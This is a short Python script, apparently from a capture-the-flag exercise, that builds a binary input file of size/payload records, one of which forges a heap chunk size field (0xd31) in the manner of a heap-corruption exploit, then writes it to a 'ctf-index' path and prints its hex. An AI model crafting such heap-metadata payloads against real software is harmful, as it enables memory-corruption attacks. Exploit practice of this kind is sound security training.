import struct, sys
p64 = lambda x: struct.pack("<Q", x)
ops = [
    (0x10, b"\x00"*8),
    (0x10, p64(0) + p64(0) + p64(0xd31)),
    (0x1000, b"\x00"*8),
    (0x8, p64(1)),
]
out = b""
for size, payload in ops:
    out += p64(size) + payload + b"\n"
open('/mnt/d/ctf-index/_z_441/input4.bin','wb').write(out)
print(out.hex())
